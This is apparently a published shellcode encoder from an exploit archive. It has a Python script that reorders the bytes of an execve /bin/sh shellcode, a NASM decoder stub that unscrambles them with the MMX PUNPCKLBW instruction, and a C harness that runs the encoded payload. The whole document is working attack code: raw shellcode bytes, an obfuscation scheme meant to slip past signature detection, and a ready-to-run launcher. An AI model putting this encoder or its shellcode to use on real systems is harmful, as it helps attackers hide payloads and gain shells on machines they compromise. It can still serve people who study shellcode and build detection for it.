################################################################################
INTRO
################################################################################

# Exploit Title: MMX-PUNPCKLBW Encoder
# Description: Payload encoder using MMX PUNPCKLBW instruction
# Date: 13/04/2019
# Exploit Author: Petr Javorik
# Tested on: Linux ubuntu 3.13.0-32-generic x86
# Shellcode length: 61

################################################################################
ENCODER
################################################################################

#!/usr/bin/env python

# stack execve
SHELLCODE = bytearray(
    b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
)

# Align to qword multiples
missing_bytes = 8 - (len(SHELLCODE) % 8)
padding = [0x90 for _ in range(missing_bytes)]
SHELLCODE.extend(padding)

# Shuffle payload
shuffled_payload = []
# First byte carries count of needed PUNPCKLBW loops
loop_count = len(SHELLCODE)//8
shuffled_payload.append(loop_count)
for block_num in range(0, loop_count):
    current_block = SHELLCODE[(8 * block_num) : (8 * block_num + 8)]
    shuffled_block = [current_block[i] for i in [0, 2, 4, 6, 1, 3, 5, 7]]
    shuffled_payload.extend(shuffled_block)

# Remove trailing NOPS
for byte in shuffled_payload[::-1]:
    if byte == 0x90:
        del shuffled_payload[-1]
    else:
        break

# Print shellcode
print('Payload length: {}'.format(len(shuffled_payload)))
print('\\x' + '\\x'.join('{:02x}'.format(byte) for byte in shuffled_payload))
print('0x' + ',0x'.join('{:02x}'.format(byte) for byte in shuffled_payload))

################################################################################
DECODER
################################################################################

global _start

section .text
_start:

    jmp short call_decoder

decoder:

    pop edi
    xor ecx, ecx
    mov cl, [edi]
    inc edi
    mov esi, edi

decode:

    movq mm0, qword [edi]
    movq mm1, qword [edi +4]
    punpcklbw mm0, mm1
    movq qword [edi], mm0
    add edi, 0x8
    loop decode
    jmp esi

call_decoder:

    call decoder
    EncodedShellcode: db 0x04,0x31,0x50,0x2f,0x73,0xc0,0x68,0x2f,0x68,0x68,0x62,0x6e,0xe3,0x2f,0x69,0x89,0x50,0x89,0x53,0xe1,0x0b,0xe2,0x89,0xb0,0xcd,0x80

################################################################################
TESTING
################################################################################

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x1c\x5f\x31\xc9\x8a\x0f\x47\x89\xfe\x0f\x6f\x07\x0f\x6f\x4f\x04\x0f\x60\xc1\x0f\x7f\x07\x83\xc7\x08\xe2\xee\xff\xe6\xe8\xdf\xff\xff\xff\x04\x31\x50\x2f\x73\xc0\x68\x2f\x68\x68\x62\x6e\xe3\x2f\x69\x89\x50\x89\x53\xe1\x0b\xe2\x89\xb0\xcd\x80";

main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*CodeFun)() = (int(*)())code;
    CodeFun();
}